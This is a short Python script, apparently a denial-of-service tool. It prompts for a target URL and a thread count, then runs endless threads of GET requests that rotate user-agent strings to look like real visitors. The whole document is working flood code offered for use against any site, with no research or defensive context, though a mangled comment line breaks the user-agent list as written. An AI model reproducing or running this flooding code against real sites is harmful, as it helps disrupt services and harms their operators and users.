import threading
import requests
import random
import time

# Random user agents for more realism                user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

def generate_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

# Get inputs
url = input("Enter target URL: ")
threads = int(input("Number of threads: "))
delay = float(input("Delay between requests (seconds, e.g. 0.1): "))

def attack():
    while True:
        try:
            response = requests.get(url, headers=generate_headers())
            print(f"[+] Status: {response.status_code}")
            time.sleep(delay)
        except Exception as e:
            print(f"[-] Error: {e}")

# Start threads
for i in range(threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

# Keep main thread alive
while True:
    time.sleep(1)
